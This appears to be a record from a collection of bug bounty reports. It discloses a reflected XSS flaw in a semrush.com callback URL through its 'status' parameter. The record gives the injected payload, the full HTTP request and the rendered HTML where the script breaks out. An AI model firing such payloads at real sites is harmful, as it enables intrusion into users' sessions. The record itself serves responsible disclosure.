      "category": "team",
      "content": "Researcher found reflected XSS vulnerability on https://www.semrush.com/my_reports/externalSource/callback/googleAccountsGMB\n\n**Report:**\nThe parameter status is missing sanitization in the following url:\n\n>https://www.semrush.com/my_reports/externalSource/callback/googleAccountsGMB?status=</xss>xss<script>alert()// \n\nRequest:\n\n>GET /my_reports/externalSource/callback/googleAccountsGMB?status=</xss>xss<script>alert()// HTTP/1.1\nHost: www.semrush.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nPragma: no-cache\nCache-Control: no-cache\n\ncode rendered\n\n><main class=\"srf-layout__body\" id=\"root-content\">\n<script>window.opener.connectExternalSourceCallback({\"status\":\"</xss>xss<script>alert()//\",\"source\":\"googleAccountsGMB\"});</script>\n</main>\n",
